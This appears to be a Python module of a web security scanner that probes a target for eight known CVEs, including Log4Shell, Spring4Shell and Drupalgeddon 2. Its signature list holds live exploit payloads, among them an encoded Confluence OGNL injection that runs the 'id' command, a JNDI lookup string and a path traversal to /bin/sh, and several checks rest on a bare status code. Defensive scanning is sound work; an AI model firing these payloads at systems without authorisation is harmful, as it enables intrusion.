import json
import urllib.request
import urllib.error
import urllib.parse
import ssl

from scanners.base_scanner import BaseScanner

CVE_SIGNATURES = [
    {
        "id": "CVE-2021-44228",
        "name": "Log4Shell",
        "severity": "Critical",
        "cvss": 10.0,
        "affected": ["Apache Log4j 2.x < 2.15.0"],
        "probe": {"header": "${jndi:ldap://127.0.0.1/a}", "param": "q"},
        "detect": lambda code, body, headers: code == 500,
    },
    {
        "id": "CVE-2022-22965",
        "name": "Spring4Shell",
        "severity": "Critical",
        "cvss": 9.8,
        "affected": ["Spring Framework 5.3.x < 5.3.18", "5.2.x < 5.2.20"],
        "probe": {
            "param": "class.module.classLoader.URLs%5B0%5D=0",
        },
        "detect": lambda code, body, headers: code == 400,
    },
    {
        "id": "CVE-2022-26134",
        "name": "Confluence OGNL Injection",
        "severity": "Critical",
        "cvss": 9.8,
        "affected": ["Atlassian Confluence Server/DC < 7.18.0"],
        "probe": {
            "path_payload": "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
        },
        "detect": lambda code, body, headers: "X-Cmd-Response" in headers,
    },
    {
        "id": "CVE-2021-41773",
        "name": "Apache HTTP Server Path Traversal",
        "severity": "High",
        "cvss": 7.5,
        "affected": ["Apache HTTP Server 2.4.49"],
        "probe": {"path": "/cgi-bin/.%2e/%2e%2e/bin/sh"},
        "detect": lambda code, body, headers: code == 200 and "root:" in body,
    },
    {
        "id": "CVE-2021-40438",
        "name": "Apache HTTP Server SSRF",
        "severity": "High",
        "cvss": 8.1,
        "affected": ["Apache HTTP Server 2.4.x < 2.4.49"],
        "probe": {"path": "/?unix:xxx|http://127.0.0.1:80"},
        "detect": lambda code, body, headers: code not in (404, 400),
    },
    {
        "id": "CVE-2020-14750",
        "name": "Oracle WebLogic Authentication Bypass",
        "severity": "Critical",
        "cvss": 9.8,
        "affected": ["Oracle WebLogic 10.3.6", "12.1.3", "12.2.1.3", "12.2.1.4", "14.1.1.0"],
        "probe": {"path": "/console/css/%2e%2e%2fconsole.portal"},
        "detect": lambda code, body, headers: code == 200 and "WebLogic" in body,
    },
    {
        "id": "CVE-2018-7600",
        "name": "Drupalgeddon 2 (RCE)",
        "severity": "Critical",
        "cvss": 9.8,
        "affected": ["Drupal 7.x < 7.58", "8.x < 8.5.1"],
        "probe": {"path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"},
        "detect": lambda code, body, headers: "drupal_ajax" in body,
    },
    {
        "id": "CVE-2017-9791",
        "name": "Apache Struts S2-048 (RCE)",
        "severity": "Critical",
        "cvss": 9.8,
        "affected": ["Apache Struts 2.3.x < 2.3.32"],
        "probe": {"path": "/struts2-showcase/integration/saveGangster.action"},
        "detect": lambda code, body, headers: code == 200 and "struts" in body.lower(),
    },
]


class CveScanner(BaseScanner):
    SCANNER_NAME = "Known Exploits & CVE Signature Scanner"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self.base_url = target.rstrip("/")

    def run(self):
        self.log("INFO",
                 f"[CVE] Starting signature checks against {len(CVE_SIGNATURES)} CVEs on {self.target}...")

        try:
            for cve in CVE_SIGNATURES:
                self._check_cve(cve)
        except Exception as e:
            self.log("WARNING", f"[CVE] Error during scan: {e}")

        self.log(
            "SUCCESS" if not self.vulns else "WARNING",
            f"[CVE] Checks complete. {len(self.vulns)} CVE(s) confirmed.",
        )
        return self.vulns

    def _check_cve(self, cve: dict):
        probe = cve.get("probe", {})
        detect = cve.get("detect")
        headers = {"User-Agent": "LarShield/2.0 CVE-Scanner"}

        try:
            path = probe.get("path", "")
            path_payload = probe.get("path_payload", "")
            param = probe.get("param", "")
            header_val = probe.get("header", "")
            query_str = probe.get("param", "")

            test_url = f"{self.base_url}{path}"
            if path_payload:
                test_url = f"{self.base_url}/{path_payload}"
            if query_str and not path:
                test_url = f"{self.base_url}/?{query_str}"

            req_headers = dict(headers)
            if header_val:
                req_headers["User-Agent"] = header_val
                req_headers["X-Forwarded-For"] = header_val
                req_headers["Referer"] = header_val

            ctx = self.get_ssl_context()
            req = urllib.request.Request(test_url, headers=req_headers)

            try:
                with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                    body = resp.read(4096).decode("utf-8", errors="ignore")
                    code = resp.status
                    resp_headers = resp.headers
            except urllib.error.HTTPError as e:
                body = e.read(4096).decode("utf-8", errors="ignore") if e.fp else ""
                code = e.code
                resp_headers = e.headers if hasattr(e, "headers") else {}
            except Exception as e:
                self.log("ERROR", f"[CVE] _check_cve request error: {e}")
                return

            if detect and detect(code, body, resp_headers):
                self.log("CRITICAL",
                         f"[CVE] Confirmed: {cve['name']} ({cve['id']})")
                self.add_vuln(
                    title=f"{cve['name']} ({cve['id']})",
                    severity=cve["severity"],
                    category="Known Exploit / CVE",
                    cvss_score=cve["cvss"],
                    description=f"The target appears vulnerable to {cve['name']} ({cve['id']}).\n"
                    f"Affected: {', '.join(cve['affected'])}",
                    remediation=f"Apply the latest security patch for {cve['id']}. "
                    f"Refer to vendor advisory for detailed mitigation steps.",
                    evidence=f"HTTP {code} with matching signature",
                    request_details=f"GET {test_url}",
                )

        except Exception as e:
            self.log("ERROR", f"[CVE] _check_cve error: {e}")
